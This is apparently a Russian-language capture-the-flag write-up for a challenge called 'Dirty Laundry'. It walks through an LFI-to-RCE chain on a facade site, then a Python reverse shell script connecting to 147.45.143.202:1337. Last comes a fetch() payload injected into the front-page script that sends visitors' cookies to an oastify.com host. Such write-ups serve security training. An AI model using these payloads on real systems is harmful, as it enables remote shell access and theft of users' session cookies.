# Dirty Laundry writeup

Дан сайт-фасад. 

![image.png](Dirty%20Laundry%20writeup/image.png)

В исходном коде одного из скриптов обнаруживаем вызов JS файла из сторонней директории:

![image.png](Dirty%20Laundry%20writeup/image%201.png)

![image.png](Dirty%20Laundry%20writeup/image%202.png)

Перейдем в корень директории и увидим листинг файлов:

![image.png](Dirty%20Laundry%20writeup/image%203.png)

Идем в myProject:

![image.png](Dirty%20Laundry%20writeup/image%204.png)

![image.png](Dirty%20Laundry%20writeup/image%205.png)

Исследуем параметр work. В нем LFI-уязвимость:

![image.png](Dirty%20Laundry%20writeup/image%206.png)

Посмотрим код текущей страницы:

![image.png](Dirty%20Laundry%20writeup/image%207.png)

Видим опасную функцию shell_exec, обходим фильтр и получаем RCE:

![image.png](Dirty%20Laundry%20writeup/image%208.png)

Поисследуем фильтрацию и получим reverse shell. Учитывая фильтрующие символы, подойдет пейлоад на python. Будем писать в директорию tmp, так как у пользователя есть права создания файлов в эту директорию (Sticky bit)

```bash
echo "import os,pty,socket" > /tmp/rev     
echo "s=socket.socket()" >> /tmp/rev
echo 's.connect(("147.45.143.202",1337))' >> /tmp/rev
echo '[os.dup2(s.fileno(),f)for f in(0,1,2)]' >> /tmp/rev
echo 'pty.spawn("/bin/bash")' >> /tmp/rev
```

Поднимаем слушатель и ловим шелл:

![image.png](Dirty%20Laundry%20writeup/image%209.png)

Готово:

![image.png](Dirty%20Laundry%20writeup/image%2010.png)

Как развивать атаку? Тема посвящена XSS, и по условию известно, что клиент заходит на начальную страницу сайта. Мы можем подложить вредоносный код в скрипт, через который мы попали в скрытую директорию.

![image.png](Dirty%20Laundry%20writeup/image%2011.png)

Подставим CORS-промис, крадущий куки пользователя:

```bash
fetch('http://zhkn0l0y840fgmzsn5022l3tskybm7aw.oastify.com?c='+document.cookie)
```

![image.png](Dirty%20Laundry%20writeup/image%2012.png)

Осталось подождать, пока жертва попадется на крючок:

![image.png](Dirty%20Laundry%20writeup/image%2013.png)

Профит! :)